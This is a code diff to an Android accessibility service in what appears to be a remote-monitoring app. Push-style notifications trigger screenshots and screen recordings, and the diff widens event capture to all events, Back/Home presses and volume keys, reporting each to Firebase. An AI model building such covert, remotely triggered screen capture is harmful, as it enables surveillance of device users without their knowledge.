@@ -12,6 +12,7 @@ import android.os.Looper;
 import android.os.Parcelable;
 import android.util.Log;
 import android.view.Display;
+import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
 
@@ -44,55 +45,74 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     TaskSuccess taskSuccess;
 
+    public static accessibilityService instance;
+
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
+        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
         info.notificationTimeout = 100;
         setServiceInfo(info);
+        instance = this;
+        updateAccessibility();
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
 
-        if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {
-
             if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                Log.d(TAG, "Recieved event");
-                Parcelable data = accessibilityEvent.getParcelableData();
-                if (data instanceof Notification) {
-                    Log.d(TAG, "Recieved notification");
-                    Notification notification = (Notification) data;
+                if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {
+                    Log.d(TAG, "Recieved event");
+                    Parcelable data = accessibilityEvent.getParcelableData();
+                    if (data instanceof Notification) {
+                        Log.d(TAG, "Recieved notification");
+                        Notification notification = (Notification) data;
 
-                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
+                        if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
 
-                        String title = notification.extras.getString("android.title");
-                        if (title.contains("com.reiserx.testtrace.accessibility")) {
-                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-                            String UserID = save.getString("UserID", "");
+                            String title = notification.extras.getString("android.title");
+                            if (title.contains("com.reiserx.testtrace.accessibility")) {
+                                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                                String UserID = save.getString("UserID", "");
 
-                            int message = Integer.parseInt(notification.extras.getString("android.text"));
-                            Log.d(TAG, title);
-                            switch (message) {
-                                case 1:
-                                    takeScreenshots(UserID);
-                                    Log.d(TAG, String.valueOf(message));
-                                    break;
-                                case 2:
-                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
-                                    final Handler handler = new Handler(Looper.getMainLooper());
-                                    startRecording();
-                                    handler.postDelayed(() -> stopRecording(UserID), value);
-                                    break;
+                                int message = Integer.parseInt(notification.extras.getString("android.text"));
+                                Log.d(TAG, title);
+                                switch (message) {
+                                    case 1:
+                                        takeScreenshots(UserID);
+                                        Log.d(TAG, String.valueOf(message));
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 2:
+                                        long value = Long.parseLong(title.replaceAll("[\\D]", ""));
+                                        final Handler handler = new Handler(Looper.getMainLooper());
+                                        startRecording();
+                                        handler.postDelayed(() -> stopRecording(UserID), value);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                }
                             }
                         }
                     }
                 }
             }
-        }
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
+                if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
+                    Log.d(TAG, "back");
+                    instance = this;
+                    updateAccessibility();
+                } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
+                    Log.d(TAG, "home");
+                    instance = this;
+                    updateAccessibility();
+                }
+            }
     }
 
     @Override
@@ -104,6 +124,26 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
         super.takeScreenshot(displayId, executor, callback);
     }
+
+    @Override
+    protected boolean onKeyEvent(KeyEvent event) {
+        int action = event.getAction();
+        int keyCode = event.getKeyCode();
+
+        if (action == KeyEvent.ACTION_UP) {
+            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
+                Log.d(TAG, "KeyUp");
+                instance = this;
+                updateAccessibility();
+            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
+                Log.d(TAG, "KeyDown");
+                instance = this;
+                updateAccessibility();
+            }
+        }
+        return super.onKeyEvent(event);
+    }
+
 
     public void takeScreenshots(String UserID) {
 
@@ -219,4 +259,10 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         });
     }
 
+    private void updateAccessibility () {
+        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+        String UserID = save.getString("UserID", "");
+        String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
+        FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
+    }
 }
